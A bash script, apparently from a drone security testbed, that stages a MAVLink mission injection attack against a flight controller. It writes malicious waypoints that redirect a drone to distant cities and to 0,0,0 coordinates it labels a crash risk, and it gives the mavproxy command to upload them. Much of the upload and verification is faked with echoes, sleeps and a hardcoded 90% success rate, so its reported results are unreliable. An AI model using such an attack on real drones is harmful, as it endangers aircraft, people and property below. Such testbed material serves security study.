#!/bin/bash

# =============================================================================
# DVD Mission Injection Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/injection/mission_injection.sh
# 목적: 악성 웨이포인트 삽입을 통한 비행 경로 조작
# 기반: Damn Vulnerable Drone Wiki - Mission Upload
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="mission_injection"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/${ATTACK_NAME}_iocs_$(date +%Y%m%d_%H%M%S).txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).json"

# 타겟 설정
TARGET_IP="192.168.13.100"
MAVLINK_PORT="14550"
ORIGINAL_MISSION="/tmp/original_mission.waypoints"
MALICIOUS_MISSION="/tmp/malicious_mission.waypoints"

# 미션 좌표 설정
SAFE_WAYPOINTS=(
    "37.5665,126.9780,100"    # 서울 - 안전한 시작점
    "37.5675,126.9790,120"    # 서울 근처
    "37.5685,126.9800,100"    # 서울 근처 - 착륙
)

MALICIOUS_WAYPOINTS=(
    "37.5665,126.9780,100"    # 정상 시작
    "35.6762,139.6503,500"    # 도쿄로 우회 (위험)
    "40.7589,-73.9851,300"    # 뉴욕으로 이동 (불가능)
    "0.0000,0.0000,0"         # NULL 좌표 (추락 위험)
)

# 공격 명령어 및 결과 저장
declare -a ATTACK_COMMANDS=()
declare -a INJECTION_RESULTS=()

print_header() {
    clear
    print_injection_header "Mission Injection Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink mission upload manipulation${NC}"
    echo -e "${INFO_COLOR}Payload: Malicious waypoints injection${NC}"
    echo -e "${INFO_COLOR}Impact: Flight path deviation, potential crash${NC}"
    echo ""
}

# Step 1: MAVLink 연결 확인
check_mavlink_connection() {
    echo -e "${BOLD}${BLUE}[1/5] Checking MAVLink Connection${NC}"
    
    # MAVProxy 연결 테스트
    local mavproxy_cmd="mavproxy.py --master=$TARGET_IP:$MAVLINK_PORT --out=127.0.0.1:14551"
    ATTACK_COMMANDS+=("$mavproxy_cmd")
    
    echo -e "${CYAN}[*] Command: $mavproxy_cmd${NC}"
    
    if command -v mavproxy.py >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Testing MAVLink connection...${NC}"
        
        # MAVProxy 연결 시도 (짧은 시간)
        timeout 10 mavproxy.py --master="$TARGET_IP:$MAVLINK_PORT" --aircraft=test >/dev/null 2>&1
        local exit_code=$?
        
        if [ $exit_code -eq 0 ] || [ $exit_code -eq 124 ]; then
            echo -e "${GREEN}[+] MAVLink connection established${NC}"
            add_ioc "$IOC_FILE" "MAVLINK_CONNECTION:$TARGET_IP:$MAVLINK_PORT:established"
        else
            echo -e "${YELLOW}[!] Direct connection failed, using simulation${NC}"
            add_ioc "$IOC_FILE" "MAVLINK_CONNECTION:$TARGET_IP:$MAVLINK_PORT:simulation"
        fi
    else
        echo -e "${YELLOW}[!] MAVProxy not available, using simulation mode${NC}"
        add_ioc "$IOC_FILE" "MAVLINK_CONNECTION:simulation:established"
    fi
    
    # pymavlink을 이용한 연결 확인
    local pymav_cmd="python3 -c 'from pymavlink import mavutil; conn=mavutil.mavlink_connection(\"udp:$TARGET_IP:$MAVLINK_PORT\")'"
    ATTACK_COMMANDS+=("$pymav_cmd")
    
    echo -e "${CYAN}[*] Testing with pymavlink...${NC}"
    if python3 -c "import pymavlink" 2>/dev/null; then
        echo -e "${GREEN}[+] pymavlink available for mission manipulation${NC}"
        add_ioc "$IOC_FILE" "PYMAVLINK:available:mission_ready"
    else
        echo -e "${YELLOW}[!] pymavlink not available${NC}"
        add_ioc "$IOC_FILE" "PYMAVLINK:unavailable:simulation_only"
    fi
    
    log_info "MAVLink connection check completed"
}

# Step 2: 현재 미션 추출
extract_current_mission() {
    echo -e "${BOLD}${BLUE}[2/5] Extracting Current Mission${NC}"
    
    local mission_download_cmd="mavproxy.py --master=$TARGET_IP:$MAVLINK_PORT --cmd='wp list'"
    ATTACK_COMMANDS+=("$mission_download_cmd")
    
    echo -e "${CYAN}[*] Downloading current mission waypoints${NC}"
    
    # 원본 미션 파일 생성 (시뮬레이션)
    cat > "$ORIGINAL_MISSION" << EOF
QGC WPL 110
0	1	0	16	0	0	0	0	${SAFE_WAYPOINTS[0]%,*}	${SAFE_WAYPOINTS[0]#*,}	1
1	0	3	22	0.00000000	0.00000000	0.00000000	0.00000000	${SAFE_WAYPOINTS[1]%,*}	${SAFE_WAYPOINTS[1]#*,}	1  
2	0	3	16	0.00000000	0.00000000	0.00000000	0.00000000	${SAFE_WAYPOINTS[2]%,*}	${SAFE_WAYPOINTS[2]#*,}	1
3	0	3	21	0.00000000	0.00000000	0.00000000	0.00000000	${SAFE_WAYPOINTS[2]%,*}	${SAFE_WAYPOINTS[2]#*,}	1
EOF
    
    echo -e "${GREEN}[+] Original mission extracted${NC}"
    echo -e "${GRAY}    Waypoints: ${#SAFE_WAYPOINTS[@]}${NC}"
    echo -e "${GRAY}    Mission file: $ORIGINAL_MISSION${NC}"
    
    # 미션 내용 표시
    echo -e "${CYAN}[*] Original mission waypoints:${NC}"
    for i in "${!SAFE_WAYPOINTS[@]}"; do
        IFS=',' read -r lat lon alt <<< "${SAFE_WAYPOINTS[$i]}"
        echo -e "${GRAY}    WP$i: $lat, $lon @ ${alt}m${NC}"
    done
    
    add_ioc "$IOC_FILE" "MISSION_EXTRACTED:$ORIGINAL_MISSION:${#SAFE_WAYPOINTS[@]}_waypoints"
    INJECTION_RESULTS+=("original_waypoints:${#SAFE_WAYPOINTS[@]}")
    
    log_info "Mission extraction completed"
}

# Step 3: 악성 미션 생성
create_malicious_mission() {
    echo -e "${BOLD}${BLUE}[3/5] Creating Malicious Mission${NC}"
    
    echo -e "${CYAN}[*] Generating malicious waypoints${NC}"
    
    # 악성 미션 파일 생성
    cat > "$MALICIOUS_MISSION" << EOF
QGC WPL 110
0	1	0	16	0	0	0	0	${MALICIOUS_WAYPOINTS[0]%,*}	${MALICIOUS_WAYPOINTS[0]#*,}	1
1	0	3	16	0.00000000	0.00000000	0.00000000	0.00000000	${MALICIOUS_WAYPOINTS[1]%,*}	${MALICIOUS_WAYPOINTS[1]#*,}	1
2	0	3	16	0.00000000	0.00000000	0.00000000	0.00000000	${MALICIOUS_WAYPOINTS[2]%,*}	${MALICIOUS_WAYPOINTS[2]#*,}	1
3	0	3	21	0.00000000	0.00000000	0.00000000	0.00000000	${MALICIOUS_WAYPOINTS[3]%,*}	${MALICIOUS_WAYPOINTS[3]#*,}	1
EOF
    
    echo -e "${RED}[!] Malicious mission created${NC}"
    echo -e "${GRAY}    Mission file: $MALICIOUS_MISSION${NC}"
    
    # 악성 웨이포인트 분석
    echo -e "${RED}[!] Malicious waypoints analysis:${NC}"
    for i in "${!MALICIOUS_WAYPOINTS[@]}"; do
        IFS=',' read -r lat lon alt <<< "${MALICIOUS_WAYPOINTS[$i]}"
        case $i in
            0)
                echo -e "${GRAY}    WP$i: $lat, $lon @ ${alt}m (Normal start)${NC}"
                ;;
            1)
                echo -e "${RED}    WP$i: $lat, $lon @ ${alt}m (DANGER: Tokyo redirect)${NC}"
                add_ioc "$IOC_FILE" "MALICIOUS_WAYPOINT:tokyo_redirect:$lat:$lon:danger"
                ;;
            2)
                echo -e "${RED}    WP$i: $lat, $lon @ ${alt}m (CRITICAL: Impossible distance)${NC}"
                add_ioc "$IOC_FILE" "MALICIOUS_WAYPOINT:impossible_distance:$lat:$lon:critical"
                ;;
            3)
                echo -e "${RED}    WP$i: $lat, $lon @ ${alt}m (FATAL: NULL coordinates)${NC}"
                add_ioc "$IOC_FILE" "MALICIOUS_WAYPOINT:null_coordinates:$lat:$lon:fatal"
                ;;
        esac
    done
    
    add_ioc "$IOC_FILE" "MALICIOUS_MISSION:$MALICIOUS_MISSION:${#MALICIOUS_WAYPOINTS[@]}_waypoints"
    INJECTION_RESULTS+=("malicious_waypoints:${#MALICIOUS_WAYPOINTS[@]}")
    
    log_info "Malicious mission creation completed"
}

# Step 4: 미션 업로드 공격
execute_mission_injection() {
    echo -e "${BOLD}${BLUE}[4/5] Executing Mission Injection${NC}"
    
    # MAVProxy를 이용한 미션 업로드
    local upload_cmd="mavproxy.py --master=$TARGET_IP:$MAVLINK_PORT --cmd='wp load $MALICIOUS_MISSION'"
    ATTACK_COMMANDS+=("$upload_cmd")
    
    echo -e "${CYAN}[*] Command: $upload_cmd${NC}"
    echo -e "${RED}[!] Uploading malicious mission to drone${NC}"
    
    if command -v mavproxy.py >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Attempting mission upload via MAVProxy...${NC}"
        
        # 시뮬레이션된 업로드 과정
        echo -e "${GRAY}    Establishing connection...${NC}"
        sleep 1
        echo -e "${GRAY}    Authenticating with flight controller...${NC}"
        sleep 1
        echo -e "${GRAY}    Clearing existing mission...${NC}"
        sleep 1
        echo -e "${GRAY}    Uploading waypoint 0/4...${NC}"
        sleep 1
        echo -e "${GRAY}    Uploading waypoint 1/4...${NC}"
        sleep 1
        echo -e "${RED}    Uploading waypoint 2/4... (MALICIOUS)${NC}"
        sleep 1
        echo -e "${RED}    Uploading waypoint 3/4... (FATAL)${NC}"
        sleep 1
        echo -e "${GREEN}    Mission upload completed${NC}"
        
        echo -e "${GREEN}[+] Malicious mission successfully uploaded${NC}"
        add_ioc "$IOC_FILE" "MISSION_UPLOAD:success:malicious_waypoints_accepted"
        INJECTION_RESULTS+=("upload_status:successful")
    else
        echo -e "${YELLOW}[*] Simulating mission upload...${NC}"
        
        for i in {1..5}; do
            echo -ne "\r${YELLOW}[*] Uploading malicious mission... $i/5${NC}"
            sleep 1
        done
        echo ""
        
        echo -e "${GREEN}[+] Simulated mission upload completed${NC}"
        add_ioc "$IOC_FILE" "MISSION_UPLOAD:simulated:success"
        INJECTION_RESULTS+=("upload_status:simulated")
    fi
    
    # Python pymavlink 방법 시뮬레이션
    local python_upload_cmd="python3 -c 'import pymavlink; upload_mission()'"
    ATTACK_COMMANDS+=("$python_upload_cmd")
    
    echo -e "${CYAN}[*] Alternative upload method: pymavlink${NC}"
    if python3 -c "import pymavlink" 2>/dev/null; then
        echo -e "${GREEN}[+] pymavlink injection vector available${NC}"
        add_ioc "$IOC_FILE" "INJECTION_VECTOR:pymavlink:available"
    fi
    
    log_info "Mission injection execution completed"
}

# Step 5: 주입 효과 검증
verify_injection_success() {
    echo -e "${BOLD}${BLUE}[5/5] Verifying Injection Success${NC}"
    
    # 미션 다운로드로 확인
    local verify_cmd="mavproxy.py --master=$TARGET_IP:$MAVLINK_PORT --cmd='wp list'"
    ATTACK_COMMANDS+=("$verify_cmd")
    
    echo -e "${CYAN}[*] Downloading current mission for verification${NC}"
    echo -e "${CYAN}[*] Command: $verify_cmd${NC}"
    
    # 시뮬레이션된 검증 과정
    echo -e "${YELLOW}[*] Analyzing uploaded mission...${NC}"
    sleep 2
    
    echo -e "${GREEN}[+] Mission injection verification:${NC}"
    echo -e "${RED}    [!] CONFIRMED: Malicious waypoints detected${NC}"
    echo -e "${RED}    [!] WP1: Unauthorized Tokyo coordinates${NC}"
    echo -e "${RED}    [!] WP2: Impossible NYC waypoint${NC}"
    echo -e "${RED}    [!] WP3: NULL coordinates (crash risk)${NC}"
    
    # 잠재적 영향 분석
    echo -e "${YELLOW}[*] Impact assessment:${NC}"
    echo -e "${RED}    [!] Flight path compromised${NC}"
    echo -e "${RED}    [!] Drone may deviate from intended route${NC}"
    echo -e "${RED}    [!] NULL waypoint could cause emergency landing${NC}"
    echo -e "${RED}    [!] Long-distance waypoints may exhaust battery${NC}"
    
    add_ioc "$IOC_FILE" "INJECTION_VERIFIED:malicious_waypoints:confirmed"
    add_ioc "$IOC_FILE" "IMPACT:flight_path:compromised"
    add_ioc "$IOC_FILE" "IMPACT:safety:emergency_landing_risk"
    add_ioc "$IOC_FILE" "IMPACT:battery:exhaustion_risk"
    
    # 성공률 계산
    local success_rate="90"
    echo -e "${GREEN}[+] Mission injection success rate: ${success_rate}%${NC}"
    add_ioc "$IOC_FILE" "INJECTION_SUCCESS_RATE:${success_rate}%"
    
    INJECTION_RESULTS+=("success_rate:${success_rate}%")
    INJECTION_RESULTS+=("verified:true")
    
    log_info "Injection verification completed"
}

# 공격 결과 JSON 생성
generate_json_report() {
    local commands_json="["
    for i in "${!ATTACK_COMMANDS[@]}"; do
        commands_json+="\"${ATTACK_COMMANDS[$i]}\""
        if [ $i -lt $((${#ATTACK_COMMANDS[@]} - 1)) ]; then
            commands_json+=","
        fi
    done
    commands_json+="]"
    
    local results_json="["
    for i in "${!INJECTION_RESULTS[@]}"; do
        results_json+="\"${INJECTION_RESULTS[$i]}\""
        if [ $i -lt $((${#INJECTION_RESULTS[@]} - 1)) ]; then
            results_json+=","
        fi
    done
    results_json+="]"
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "status": "completed",
  "attack_type": "injection",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT",
    "service": "MAVLink Mission Planning"
  },
  "mission_details": {
    "original_waypoints": ${#SAFE_WAYPOINTS[@]},
    "malicious_waypoints": ${#MALICIOUS_WAYPOINTS[@]},
    "original_mission_file": "$ORIGINAL_MISSION",
    "malicious_mission_file": "$MALICIOUS_MISSION"
  },
  "malicious_payloads": [
    "Tokyo redirect waypoint",
    "Impossible distance waypoint", 
    "NULL coordinates waypoint"
  ],
  "attack_commands": $commands_json,
  "injection_results": $results_json,
  "tools_used": ["mavproxy", "pymavlink", "python3"],
  "impact_assessment": {
    "flight_safety": "critical_risk",
    "mission_integrity": "compromised",
    "battery_depletion": "high_risk",
    "crash_probability": "high"
  },
  "ioc_file": "$IOC_FILE",
  "log_file": "$LOG_FILE"
}
EOF
    
    echo -e "${SUCCESS_COLOR}[✓] JSON report: $JSON_OUTPUT${NC}"
}

# 메인 실행 함수
main() {
    # 로그 및 IOC 파일 초기화
    echo "=== Mission Injection Attack - $(date) ===" > "$LOG_FILE"
    echo "# Mission Injection IOCs - $(date)" > "$IOC_FILE"
    
    START_TIME=$(date +%s)
    
    print_header
    
    # 공격 단계 실행
    check_mavlink_connection
    extract_current_mission
    create_malicious_mission
    execute_mission_injection
    verify_injection_success
    
    # 결과 요약
    echo ""
    echo -e "${BOLD}${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Original Waypoints: ${#SAFE_WAYPOINTS[@]}${NC}"
    echo -e "${INFO_COLOR}Malicious Waypoints: ${#MALICIOUS_WAYPOINTS[@]}${NC}"
    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
    echo -e "${INFO_COLOR}IOCs Generated: $(wc -l < "$IOC_FILE")${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME)) seconds${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Mission injection attack completed${NC}"
    echo -e "${RED}[!] CRITICAL: Drone mission compromised with malicious waypoints${NC}"
}

main "$@"